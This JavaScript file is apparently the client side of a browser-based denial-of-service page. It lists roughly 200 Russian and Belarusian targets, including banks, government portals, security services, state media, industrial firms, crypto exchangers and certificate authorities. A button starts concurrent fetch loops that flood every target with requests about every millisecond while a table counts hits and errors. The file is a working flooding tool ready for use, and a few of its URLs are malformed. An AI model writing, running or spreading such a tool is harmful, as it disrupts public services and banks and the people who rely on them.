var urls = [
    'https://absolutbank.ru/',
    'https://www.avangard.ru/rus/',
    'https://www.avtogradbank.ru/',
    'https://www.autokreditbank.ru/',
    'https://www.agroros.ru/',
    'https://ai-bank.ru/',
    'https://www.ak-bars.ru/',
    'https://www.aksonbank.ru/',
    'https://www.aktivbank.ru/',
    'https://www.akcia-bank.ru/',
    'https://www.alexbank.ru/',
    'https://www.alefbank.ru/',
    'https://albank.ru/ru/',
    'https://altbb.ru/',
    'https://capitalbank.ru/',
    'https://alfabank.com/',
    'https://www.atb.su/',
    'https://www.andjibank.ru/',
    'https://www.mfk-bank.ru/',
    'https://www.aresbank.ru/',
    'https://bank-arzamas.ru/',
    'https://www.aspectbank.ru/',
    'https://assotsiatsiyabank.ru/',
    'https://baikalrosbank.ru/',
    'https://byrich.ru/',
    'https://norvikbank.ru',
    'https://www.zemsky.ru/',
    'https://www.unicreditbank.ru',
    'https://www.open.ru/',
    'https://www.raiffeisen.ru/',
    'https://abr.ru/',
    'https://ria.ru',
    'https://gazeta.ru',
    'https://kp.ru',
    'https://riafan.ru',
    'https://pikabu.ru',
    'https://kommersant.ru',
    'https://mk.ru',
    'https://yaplakal.com',
    'https://rbc.ru',
    'https://bezformata.com',
    'https://gazprom.ru',
    'https://lukoil.ru',
    'https://magnit.ru',
    'https://nornickel.com',
    'https://surgutneftegas.ru',
    'https://tatneft.ru',
    'https://evraz.com/ru/',
    'https://nlmk.com',
    'https://sibur.ru',
    'https://severstal.com',
    'https://metalloinvest.com',
    'https://nangs.org',
    'https://rmk-group.ru/ru/',
    'https://tmk-group.ru',
    'https://ya.ru',
    'https://polymetalinternational.com/ru/',
    'https://uralkali.com/ru/',
    'https://eurosib.ru',
    'https://omk.ru',
    'https://gosuslugi.ru',
    'https://mos.ru/',
    'https://kremlin.ru',
    'https://government.ru',
    'https://mil.ru',
    'https://nalog.gov.ru',
    'https://customs.gov.ru',
    'https://pfr.gov.ru',
    'https://rkn.gov.ru',
    'https://lenta.ru',
    'https://www.rt.com/',
    'https://smotrim.ru/',
    'https://tvzvezda.ru/',
    'https://vsoloviev.ru/',
    'https://www.vesti.ru/',
    'https://online.sberbank.ru/',
    'https://iz.ru',
    'https://ukraina.ru',
    'https://www.sberbank.ru',
    'https://www.vtb.ru',
    'https://www.gazprombank.ru',
    'https://newletters.kremlin.ru/',
    'https:s//20.kremlin.ru/',
    'https://constitution.kremlin.ru',            
    'https://belta.by',
    'https://www.ctv.by',
    'https://belarus24.by',
    'https://alfaradio.by',
    'https://www.kgb.by',
    'https://sputnik.by',
    'https://rec.gov.by',
    'https://radiomir.by/',
    'https://radiostalica.by/',
    'https://radiobrestfm.by/',
    'https://www.tvrmogilev.by/',
    'https://minsknews.by/',
    'https://zarya.by/',
    'https://grodnonews.by/',
    'https://www.tvr.by/',
    'https://brrb.by/',
    'https://www.belapb.by/',
    'https://bankdabrabyt.by/', 
    'https://mail.rkn.gov.ru/', 
    'https://cloud.rkn.gov.ru', 
    'https://mvd.gov.ru', 
    'https://pwd.wto.economy.gov.ru/', 
    'https://stroi.gov.ru/', 
    'https://proverki.gov.ru/',
    'https://ont.by', 
    'https://nbrb.by',
    'https://bgb.by',
    'https://belres.by',
    'https://energo.by',
    'https://www.belneftekhim.by',
    'https://shop-rt.com',
    'https://sb.by',
    'https://belarusbank.by',
    'https://belarus.by',
    'https://belmarket.by',
    'https://mil.by',
    'https://president.gov.by',
    'https://cleanbtc.ru/',
    'https://bonkypay.com/',
    'https://changer.club/',
    'https://superchange.net',
    'https://mine.exchange/',
    'https://platov.co',
    'https://ww-pay.net/',
    'https://delets.cash/',
    'https://betatransfer.org',
    'https://ramon.money/',
    'https://coinpaymaster.com/',
    'https://bitokk.biz/',
    'https://www.netex24.net',
    'https://cashbank.pro/',
    'https://flashobmen.com/',
    'https://abcobmen.com/',
    'https://ychanger.net/',
    'https://multichange.net/',
    'https://24paybank.ne',
    'https://royal.cash/',
    'https://prostocash.com/',
    'https://baksman.org/',
    'https://kupibit.me/',
    'https://abcobmen.com',
    'https://fsb.ru',
    'https://mcs.mail.ru',
    'https://roe.ru',
    'https://1tv.ru',
    'https://tass.ru',
    'https://relcom.ru',
    'https://gosuslugi41.ru',
    'https://uslugi27.ru',
    'https://gosuslugi29.ru',
    'https://gosuslugi.astrobl.ru',
    'https://prokuratura.gov.by', 
    'https://rusvesna.su/', 
    'https://oac.gov.by/', 
    'https://bisr.gov.by/', 
    'https://www.mpt.gov.by/', 
    'https://www.mfa.gov.by', 
    'https://www.mininform.gov.by',
    'https://mintrans.gov.by/',
    'https://iecp.ru/ep/ep-verification',
    'https://iecp.ru/ep/uc-list',
    'https://uc-osnovanie.ru/',
    'https://www.nucrf.ru/',
    'https://www.belinfonalog.ru',
    'https://www.roseltorg.ru',
    'https://www.astralnalog.ru',
    'https://www.nwudc.ru',
    'https://www.center-inform.ru',
    'https://kk.bank/UdTs',
    'https://structure.mil.ru/structure/uc/info.htm',
    'https://www.ucpir.ru',
    'https://dreamkas.ru',
    'https://www.e-portal.ru',
    'https://izhtender.ru',
    'https://imctax.parus-s.ru',
    'https://www.icentr.ru',
    'https://www.kartoteka.ru',
    'https://rsbis.ru/elektronnaya-podpis',
    'https://www.stv-it.ru',
    'https://www.crypset.ru',
    'https://www.kt-69.ru',
    'https://www.24ecp.ru',
    'https://kraskript.com',
    'https://ca.ntssoft.ru',
    'https://www.y-center.ru',
    'https://www.rcarus.ru',
    'https://rk72.ru',
    'https://squaretrade.ru',
    'https://ca.gisca.ru',
    'https://www.otchet-online.ru',
    'https://udcs.ru',
    'https://www.cit-ufa.ru',
    'https://elkursk.ru',
    'https://www.icvibor.ru',
    'https://ucestp.ru',
    'https://mcspro.ru',
    'https://www.infotrust.ru',
    'https://epnow.ru',
    'https://ca.kamgov.ru',
    'https://mascom-it.ru',
    'https://cfmc.ru',
    'https://rttv.com/'
];

// initialize variables
var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
var statRow = document.querySelector("#stats > .row");
var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
var CONCURRENCY_LIMIT = 200;
var queue = [];
var attack = false;
var totalrequests = 0;
var totalerrors = 0;

function togglePause () {
    if (attack) {
        attack = false;
        document.querySelector("div.desc .btn").innerText = "Resume";
    } else {
        attack = true;
        document.querySelector("div.desc .btn").innerText = "Pause";
        for (var i=0; i<urls.length; i++) {
            flood(i);
        }
    }
}

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        signal: controller.signal,
        mode: 'no-cors'
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}         

async function flood(n) {
    const url = urls[n];
    const target = targets[url];

    while (attack) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift();
        }
        queue.push(
            fetchWithTimeout(url, { timeout: 2000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    target.number_of_errored_responses++;
                    target.error_message = error.message;
                    totalerrors++;
                })
                .then((response) => {
                    if (response && !response.ok) {
                        target.number_of_errored_responses++;
                        target.error_message = response.statusText;
                        totalerrors++;
                    }
                    target.number_of_requests++;
                })
                .finally(() => updateTargetDisplay(n))
        );

        await sleep(1);
    }
}

function updateTargetDisplay(n) {
    var url = urls[n];
    var {number_of_requests, number_of_errored_responses} = targets[url];
    var requests_cell = document.querySelector(`#target${n} .requests`);
    var errors_cell = document.querySelector(`#target${n} .errors`);
    requests_cell.innerText = number_of_requests;
    errors_cell.innerText = number_of_errored_responses;
    document.querySelector("#totalrequests").innerText = totalrequests;
    document.querySelector("#totalerrors").innerText = totalerrors;
}

for (let i = urls.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [urls[i], urls[j]] = [urls[j], urls[i]];
}

for (var i=0; i<urls.length; i++) {
    statRow.innerHTML += `
        <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
            <h4>${urls[i]}</h4>
            <table class='status'>
                <tr><td>requests:</td><td class="requests">0</td></tr>
                </tr><td>errors:</td><td class="errors">0</td></tr>
            </table>
        </div>
    `;
}

myModal.toggle();
